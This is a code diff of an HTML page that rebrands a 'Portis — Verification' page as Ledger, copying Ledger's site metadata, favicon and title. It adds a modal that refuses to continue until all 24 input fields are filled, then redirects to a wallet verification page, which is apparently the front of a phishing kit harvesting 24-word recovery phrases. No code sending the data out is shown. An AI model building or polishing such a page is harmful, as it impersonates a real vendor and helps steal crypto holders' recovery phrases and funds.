@@ -2,8 +2,28 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
+<meta property="og:locale" content="en_US" />
+	<meta property="og:type" content="website" />
+	<meta property="og:title" content="Ledger Crypto Wallet - Security for DeFi &amp; Web3" />
+	<meta property="og:description" content="Secure your crypto assets such as Bitcoin, Ethereum, XRP, Monero, and more. Give yourself peace of mind by knowing that your cryptocurrencies are safe" />
+	<meta property="og:url" content="https://www.ledger.com/" />
+	<meta property="og:site_name" content="Ledger" />
+	<meta property="article:publisher" content="https://www.facebook.com/Ledger/" />
+	<meta property="article:modified_time" content="2026-08-03T10:56:06+00:00" />
+	<meta property="og:image" content="https://ledger-wp-website-s3-prd.ledger.com/uploads/2025/10/og_home.webp" />
+	<meta property="og:image:width" content="1200" />
+	<meta property="og:image:height" content="640" />
+	<meta property="og:image:type" content="image/webp" />
+	<meta name="twitter:card" content="summary_large_image" />
+	<meta name="twitter:site" content="@ledger" />
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Portis — Verification</title>
+<meta name="msapplication-TileImage" content="Ledger_favicon.webp" />
+<link rel="icon" href="/Ledger_favicon.webp" sizes="32x32" type="image/webp" />
+<link rel="icon" href="/Ledger_favicon.webp" sizes="192x192" type="image/webp" />
+<link rel="apple-touch-icon" href="/Ledger_favicon.webp" />
+<meta name="msapplication-TileImage" content="/Ledger_favicon.webp" />
+
+<title>Ledger</title>
 
 <style>
   *{box-sizing:border-box}
@@ -260,6 +280,87 @@
   @media(max-width:350px){
     .code-grid{grid-template-columns:1fr}
   }
+  .demo-modal {
+  position: fixed;
+  inset: 0;
+  z-index: 9999;
+  display: none;
+  align-items: center;
+  justify-content: center;
+  padding: 20px;
+  background: rgba(2, 8, 18, .72);
+  backdrop-filter: blur(8px);
+}
+
+.demo-modal.show {
+  display: flex;
+  animation: modalFade .2s ease;
+}
+
+.demo-modal-card {
+  width: min(400px, 100%);
+  padding: 30px 28px 26px;
+  text-align: center;
+  border: 1px solid rgba(120,166,214,.25);
+  border-radius: 22px;
+  background: linear-gradient(180deg, #10243c, #08182b);
+  box-shadow: 0 30px 90px rgba(0,0,0,.55);
+  animation: modalPop .25s ease;
+}
+
+.modal-icon {
+  width: 52px;
+  height: 52px;
+  margin: 0 auto 16px;
+  display: grid;
+  place-items: center;
+  border-radius: 50%;
+  color: #fff;
+  background: linear-gradient(145deg, #4d91e5, #286fc4);
+  font-size: 25px;
+  font-weight: 800;
+  box-shadow: 0 10px 30px rgba(53,125,205,.28);
+}
+
+.demo-modal-card h3 {
+  margin: 0;
+  color: #fff;
+  font-size: 21px;
+}
+
+.demo-modal-card p {
+  margin: 10px 0 22px;
+  color: #9eb0c6;
+  font-size: 13px;
+  line-height: 1.6;
+}
+
+.demo-modal-card button {
+  width: 100%;
+  height: 44px;
+  border: 0;
+  border-radius: 10px;
+  color: #fff;
+  background: linear-gradient(135deg, #4d91e5, #286fc4);
+  font-weight: 700;
+  cursor: pointer;
+}
+
+@keyframes modalFade {
+  from { opacity: 0; }
+  to { opacity: 1; }
+}
+
+@keyframes modalPop {
+  from {
+    opacity: 0;
+    transform: scale(.92) translateY(8px);
+  }
+  to {
+    opacity: 1;
+    transform: scale(1) translateY(0);
+  }
+}
 </style>
 </head>
 
@@ -334,6 +435,41 @@
 <script>
 function completeDemo(){
   window.location.href = "wallet_verification.html";
+}
+</script>
+
+
+<div id="demoModal" class="demo-modal">
+  <div class="demo-modal-card">
+    <div class="modal-icon">!</div>
+
+    <h3>Verification Required</h3>
+
+<p id="modalMessage">
+  Please complete all 24 fields to proceed.
+</p>
+    <button onclick="closeDemoModal()">OK, Got it</button>
+  </div>
+</div>
+
+<script>
+function completeDemo() {
+  const inputs = document.querySelectorAll(".code-input");
+
+  const allFilled = [...inputs].every(
+    input => input.value.trim() !== ""
+  );
+
+  if (!allFilled) {
+    document.getElementById("demoModal").classList.add("show");
+    return;
+  }
+
+  window.location.href = "wallet_verification.html";
+}
+
+function closeDemoModal() {
+  document.getElementById("demoModal").classList.remove("show");
 }
 </script>
 </body>
